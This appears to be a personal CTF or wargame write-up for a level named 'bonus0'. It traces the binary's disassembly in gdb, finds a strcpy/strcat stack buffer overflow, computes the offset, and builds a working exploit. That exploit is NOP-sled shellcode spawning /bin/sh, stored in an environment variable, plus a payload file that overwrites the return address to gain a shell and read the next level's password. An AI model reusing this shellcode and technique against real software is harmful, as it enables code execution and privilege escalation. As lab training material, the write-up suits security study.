login : pw
	bonus0 : f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728

disas main
	=> stack allocated = 0x40 = 64
	=> Load effective address of esp+0x16 into eax
		=> eax size is 0x40 - 0x16 - 0x4 for base pointer
			=> 38
			=> The and instruction may edit this value based on stack status at function call
				=> Lets neglect it
	=> mov eax into address pointed by esp
		=> call pp
	=> Load effective address of esp+0x16 into eax
	=> mov eax into address pointed by esp
		=> call puts

disas pp
	=> stack allocated 0x50 = 80
	=> p call with
		=> esp+0x4 = 0x80486a0
			=> x/s 0x80486a0
				=> " - "
		=> esp = ebp-0x30 (0x30 = 48)
			=> Undefined var so far
	=> p call another time with
		=> esp+0x4 = 0x80486a0
			=> x/s 0x80486a0
				=> " - "
		=> esp = ebp-0x1c (0x1c = 28)
			=> Undefined var so far
			=> first var size = 48-28 = 20
			=> second var size = 28-4-4 = 20
				=> -4 and -4 as edi and ebx are pushed at the beginning of the function
	=> strcpy call with
		=> esp+0x4 = ebp-0x30 (first p call var)
			=> Type is str
		=> esp = ebp+0x8
			=> ebp = main esp
			=> ebp+0x4 = next instruction pointer
			=> ebp+0x8 = passed param from main
	=> repnz scas al,BYTE PTR es:[edi]
		=> string length operation
			=> edi is ebp+0x8 (param passed from main)
			=> ecx is ebp-0x3c which is UINT_MAX
	=> add    eax,DWORD PTR [ebp+0x8]
	=> mov    WORD PTR [eax],dx
		=> eax being the length calculated during previous step
		=> ebp+0x8 is still first passed param
			=> eax = first param pointer + length
		=> dx is [ebx] which is [0x80486a4]
			=> " "
	=> strcat called with
		=> first param passed to pp as first param
		=> second param is ebp-0x1c = second p call var

disas p
	=> stack allocated = 0x1018 = 4120
	=> puts called with ebp+0xc
		=> ebp+0x8 is first param
		=> ebp+0xc is second param
	=> read called with
		=> esp+0x8 = 0x1000 = 4096
		=> esp+0x4 = ebp-0x1008
			=> buf size = 4104-4 = 4100
				=> -4 for ebp itself
		=> esp = 0x0
	=> strchr called with
		=> ebp-0x1008 = previous buf
		=> 0xa = 10 = '\n' as second param
		=> ret value is dereferenced to stored a 0
	=> strncpy call with
		=> esp+0x8 = 0x14 = 20
		=> esp+0x4 = ebp-0x1008 = read buf
		=> esp = ebp+0x8 = first function passed param

So there are 2 vulnerable functions in pp
	=> strcpy and strcat

strcpy(buf_from_main, first_p_call_read_buf)
	=> buf_from_main is 38 (neglected and instruction, so could be smaller)
		=> Lets check with gdb
			start
			i r esp
				=> 0xbffff638
			ni
			i r esp
				=> 0xbffff630
			=> The actual size it 8 bites smaller
		buf_from_main size is 30
	=> first_p_call_read_buf is at most 20 bytes long due to strncpy

strcat(buf_from_main, second_p_call_read_buf)
	=> second_p_call_read_buf is at most 20
		=> buf_from_main is 30 bytes < 20 + 20 
			=> we can overflow main stack

Lets check
	b *main+38
	r
		=> 01234567890123456789
		=> 01234567890123456789
	c
		=> segfault in 0x32313039
			=> "9012"

So with 20 char in first input, our offset is 29

Our buf is at most 29 bytes so lets forget about inserting a shell code in there
	=> env var as usual

env -i exploit=$(python -c 'print "\x90" * 10000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"') gdb bonus0
	unset env LINES
	unset env COLUMNS				
	start
	info var environ
		=> 0xb7fd2e04
	x/s *((char**)environ)
		=> 0xbfffd87d:	 "exploit=...
	p/x 0xbfffd87d+5000
		=> 0xbfffec05

As we have seen in p function disas
	=> It reads 4096 char
		=> We need to fill the buffer to force our second input to be the one we want

python -c 'print "a"*4095 + "\n" + "012345678" + "\x05\xec\xff\xbf"' > /tmp/b0
r < /tmp/b0
	=> process exited normally
	=> ok that's weird
	
python -c 'print "a"*4095 + "\n" + "012345678" + "bbbbccccddddeeee"' > /tmp/b0
r < /tmp/b0
	=> segfault in 62626262
		=> my second buffer was too small in first exploit

python -c 'print "a"*4095 + "\n" + "012345678" + "\x05\xec\xff\xbf" + "b"*12' > /tmp/b0
	=> we got a shell

Lets do it outside gdb
env -i exploit=$(python -c 'print "\x90" * 10000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"') ./bonus0 < /tmp/b0
	=> segfault

cat /tmp/b0 | env -i exploit=$(python -c 'print "\x90" * 10000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"') ./bonus0
	=> whoami
		=> bonus1
	=> cat /home/user/bonus1/.pass
		=> cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
